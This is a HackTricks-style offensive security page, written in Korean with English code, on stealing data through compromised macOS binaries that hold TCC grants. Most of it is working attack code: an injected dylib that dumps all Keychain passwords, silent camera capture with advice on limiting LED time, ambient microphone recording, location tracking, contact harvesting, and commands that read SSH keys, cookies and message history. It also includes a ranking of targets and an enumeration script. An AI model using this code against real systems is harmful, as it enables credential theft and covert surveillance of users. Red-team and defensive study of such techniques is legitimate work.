# TCC 권한을 통한 macOS 자격 증명 및 데이터 탈취

{{#include ../../../../banners/hacktricks-training.md}}

## 개요

macOS TCC (Transparency, Consent, and Control)는 민감한 사용자 데이터에 대한 접근을 보호합니다. 공격자가 **이미 TCC grants를 보유한 binary를 compromise하면**, 해당 permissions를 상속받습니다. 이 페이지에서는 데이터 탈취와 관련된 각 TCC permission의 exploitation potential을 설명합니다.<sup>[[2]](#references)</sup>

> [!WARNING]
> TCC-granted binary에 코드 injection (DYLD injection, dylib hijacking 또는 task port를 통한)을 수행하면 **해당 binary의 모든 TCC permissions를 조용히 상속받습니다**. 동일한 process가 보호된 데이터를 읽을 때 추가 prompt나 verification은 발생하지 않습니다.

---

## Keychain Access Groups

### 탈취 대상

macOS Keychain은 다음을 저장합니다:
- **Wi-Fi passwords** — 저장된 모든 wireless network credentials
- **Website passwords** — Safari, Chrome (Keychain 사용 시) 및 기타 browser passwords
- **Application passwords** — email accounts, VPN credentials, development tokens
- **Certificates and private keys** — code signing, client TLS, S/MIME encryption
- **Secure notes** — 사용자가 저장한 secrets

### Entitlement: `keychain-access-groups`

Keychain items는 **access groups**로 구성됩니다. 애플리케이션의 `keychain-access-groups` entitlement에는 해당 애플리케이션이 접근할 수 있는 groups가 나열됩니다:<sup>[[1]](#references)</sup>
```xml
<key>keychain-access-groups</key>
<array>
<string>com.apple.cfnetwork</string>   <!-- Network passwords -->
<string>com.apple.security.personal-information.identity</string>  <!-- Personal certs -->
<string>apple</string>                  <!-- Broad Apple group -->
<string>InternetAccounts</string>       <!-- Internet account passwords -->
</array>
```
### Exploitation
```bash
# Find binaries with broad keychain access groups
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND isAppleBin = 0
ORDER BY privileged DESC;"

# If you can inject into such a binary, enumerate keychain items:
security dump-keychain -d ~/Library/Keychains/login.keychain-db 2>&1 | head -100

# Find specific passwords
security find-generic-password -s "Wi-Fi" -w 2>&1
security find-internet-password -s "github.com" 2>&1
```
### Code Injection → Keychain Theft
```objc
// Injected dylib code — runs with the target's keychain groups
#import <Security/Security.h>

__attribute__((constructor))
void dumpKeychain(void) {
NSDictionary *query = @{
(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnAttributes: @YES,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll
};

CFArrayRef results = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, (CFTypeRef *)&results);

if (status == errSecSuccess) {
NSArray *items = (__bridge NSArray *)results;
for (NSDictionary *item in items) {
NSString *service = item[(__bridge id)kSecAttrService];
NSString *account = item[(__bridge id)kSecAttrAccount];
NSData *passData = item[(__bridge id)kSecValueData];
NSString *password = [[NSString alloc] initWithData:passData encoding:NSUTF8StringEncoding];
// service, account, password — the full credential triple
}
}
}
```
---

## 카메라 접근 (kTCCServiceCamera)

### Exploitation

카메라 TCC 권한(`kTCCServiceCamera` 또는 `com.apple.security.device.camera` entitlement)을 가진 바이너리는 사진과 동영상을 캡처할 수 있습니다:
```bash
# Find camera-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceCamera' AND auth_value=2;"
```
### Silent Capture
```objc
// Injected into a camera-entitled process
#import <AVFoundation/AVFoundation.h>

@interface SilentCapture : NSObject <AVCaptureVideoDataOutputSampleBufferDelegate>
@property (strong) AVCaptureSession *session;
@end

@implementation SilentCapture
- (void)startCapture {
self.session = [[AVCaptureSession alloc] init];
AVCaptureDevice *camera = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:camera error:nil];
[self.session addInput:input];

AVCaptureVideoDataOutput *output = [[AVCaptureVideoDataOutput alloc] init];
[output setSampleBufferDelegate:self queue:dispatch_get_global_queue(0, 0)];
[self.session addOutput:output];

[self.session startRunning];
// Camera LED turns on — but a brief capture may go unnoticed
}

- (void)captureOutput:(AVCaptureOutput *)output
didOutputSampleBuffer:(CMSampleBufferRef)sampleBuffer
fromConnection:(AVCaptureConnection *)connection {
// Each frame can be saved to disk or exfiltrated
// Stop after capturing a few frames to minimize LED time
[self.session stopRunning];
}
@end
```
> [!TIP]
> **macOS Sonoma**부터 메뉴 막대의 카메라 표시기는 지속적으로 표시되며 프로그래밍 방식으로 숨길 수 없습니다. **이전 macOS 버전**에서는 짧은 capture가 눈에 띄는 표시를 생성하지 않을 수 있습니다.

---

## 마이크 액세스 (kTCCServiceMicrophone)

### Exploitation

마이크 액세스는 내장 마이크, 헤드셋 또는 연결된 오디오 입력 장치에서 모든 오디오를 capture합니다:
```bash
# Find mic-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceMicrophone' AND auth_value=2;"
```
### Attack: Ambient Recording
```objc
// Injected into a mic-entitled process
#import <AVFoundation/AVFoundation.h>

- (void)recordAudio {
NSURL *url = [NSURL fileURLWithPath:@"/tmp/recording.m4a"];
NSDictionary *settings = @{
AVFormatIDKey: @(kAudioFormatMPEG4AAC),
AVSampleRateKey: @44100.0,
AVNumberOfChannelsKey: @1
};
AVAudioRecorder *recorder = [[AVAudioRecorder alloc] initWithURL:url settings:settings error:nil];
[recorder record];
// Records everything: conversations, phone calls, ambient audio

// Stop after a duration
dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
dispatch_get_main_queue(), ^{
[recorder stop];
// Exfiltrate /tmp/recording.m4a
});
}
```
---

## 위치 추적 (kTCCServiceLocation)

### Exploitation
```bash
# Find location-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service LIKE '%Location%' AND auth_value=2;"
```
### 지속적인 추적
```objc
#import <CoreLocation/CoreLocation.h>

@interface Tracker : NSObject <CLLocationManagerDelegate>
@end

@implementation Tracker
- (void)startTracking {
CLLocationManager *mgr = [[CLLocationManager alloc] init];
mgr.delegate = self;
mgr.desiredAccuracy = kCLLocationAccuracyBest;
[mgr startUpdatingLocation];
}

- (void)locationManager:(CLLocationManager *)manager
didUpdateLocations:(NSArray<CLLocation *> *)locations {
CLLocation *loc = locations.lastObject;
// loc.coordinate.latitude, loc.coordinate.longitude
// Reveals: home address, work address, travel patterns, daily routine
NSString *entry = [NSString stringWithFormat:@"%f,%f,%@\n",
loc.coordinate.latitude, loc.coordinate.longitude, [NSDate date]];
// Append to tracking log
}
@end
```
---

## 연락처 / 캘린더 / 사진

### Personal Data Exfiltration

| TCC Service | Framework | Data |
|---|---|---|
| `kTCCServiceAddressBook` | `Contacts.framework` | 이름, 이메일, 전화번호, 주소 |
| `kTCCServiceCalendar` | `EventKit` | 회의, 참석자, 위치 |
| `kTCCServicePhotos` | `Photos.framework` | 사진, 스크린샷, 위치 메타데이터 |
```bash
# Find authorized binaries for each service
for svc in kTCCServiceAddressBook kTCCServiceCalendar kTCCServicePhotos; do
echo "=== $svc ==="
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='$svc' AND auth_value=2;"
done
```
### 연락처 수집
```objc
#import <Contacts/Contacts.h>

CNContactStore *store = [[CNContactStore alloc] init];
NSArray *keys = @[CNContactGivenNameKey, CNContactFamilyNameKey,
CNContactEmailAddressesKey, CNContactPhoneNumbersKey];
CNContactFetchRequest *request = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];

[store enumerateContactsWithFetchRequest:request error:nil
usingBlock:^(CNContact *contact, BOOL *stop) {
// contact.givenName, contact.familyName
// contact.emailAddresses, contact.phoneNumbers
// All contacts exfiltrated for social engineering / spear phishing
}];
```
---

## iCloud Account Access

### Entitlement: `com.apple.private.icloud-account-access`

이 Entitlement은 `com.apple.iCloudHelper` XPC service와 통신할 수 있도록 하며, 다음에 대한 access를 제공합니다:
- **iCloud tokens** — 사용자의 Apple ID authentication tokens
- **iCloud Drive** — 모든 기기에서 동기화된 documents
- **iCloud Keychain** — 모든 Apple 기기에서 동기화된 passwords
- **Find My** — 사용자의 모든 Apple 기기의 location<sup>[[3]](#references)</sup>
```bash
# Find iCloud-entitled binaries
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE iCloudAccs = 1
ORDER BY privileged DESC;"
```
> [!CAUTION]
> iCloud 권한이 부여된 binary를 Compromise하면 공격 범위가 **단일 기기에서 전체 Apple ecosystem**으로 확장됩니다: 다른 Mac, iPhone, iPad, Apple Watch. iCloud Keychain sync로 인해 모든 기기의 password에 접근할 수 있습니다.

---

## Full Disk Access (kTCCServiceSystemPolicyAllFiles)

### 가장 강력한 TCC Permission

Full Disk Access는 다음을 포함하여 **시스템의 모든 file**에 대한 read capability를 부여합니다:
- 다른 app의 data (Messages, Mail, Safari history)
- TCC database (다른 모든 permission 공개)
- SSH key 및 configuration
- Browser cookie 및 session token
- Application database 및 cache
```bash
# Find FDA-granted binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles' AND auth_value=2;"

# With FDA, read anything:
cat ~/Library/Messages/chat.db              # iMessage history
cat ~/Library/Safari/History.db             # Safari browsing history
cat ~/Library/Cookies/Cookies.binarycookies # Browser cookies
cat ~/.ssh/id_rsa                           # SSH private key
```
---

## Exploitation 우선순위 매트릭스

Injectable TCC-granted binaries를 평가할 때는 데이터 가치를 기준으로 우선순위를 지정합니다:

| 우선순위 | TCC Permission | 이유 |
|---|---|---|
| **Critical** | Full Disk Access | 모든 항목에 액세스 가능 |
| **Critical** | TCC Manager | 모든 permission을 부여할 수 있음 |
| **High** | Keychain Access Groups | 저장된 모든 password |
| **High** | iCloud Account Access | 여러 기기 침해 |
| **High** | Input Monitoring (ListenEvent) | Keylogging |
| **High** | Accessibility | GUI 제어 및 자체 permission 부여 |
| **Medium** | Screen Capture | 시각 데이터 캡처 |
| **Medium** | Camera + Microphone | 감시 |
| **Medium** | Contacts + Calendar | Social engineering 데이터 |
| **Low** | Location | 물리적 위치 추적 |
| **Low** | Photos | 개인 데이터 |

## Enumeration Script
```bash
#!/bin/bash
echo "=== TCC Credential Theft Surface Audit ==="

echo -e "\n[*] High-value TCC grants (injectable binaries):"
sqlite3 /tmp/executables.db "
SELECT path, tccPermsStr FROM executables
WHERE (noLibVal = 1 OR allowDyldEnv = 1)
AND tccPermsStr IS NOT NULL
AND tccPermsStr != ''
ORDER BY privileged DESC
LIMIT 30;" 2>/dev/null

echo -e "\n[*] Keychain-entitled injectable binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND (noLibVal = 1 OR allowDyldEnv = 1);" 2>/dev/null

echo -e "\n[*] iCloud-entitled binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE iCloudAccs = 1;" 2>/dev/null
```
## 참고 자료

- [1] [Apple Developer — Keychain Services](https://developer.apple.com/documentation/security/keychain_services)
- [2] [Apple Developer — TCC](https://developer.apple.com/documentation/security/protecting-the-user-s-privacy)
- [3] [OBTS v5.0 — "Mac에서 발생한 일은 Apple의 iCloud에 남는다?!" (Wojciech Regula)](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [4] [Objective-See — TCC Exploitation](https://objective-see.org/blog/blog_0x4C.html)

{{#include ../../../../banners/hacktricks-training.md}}
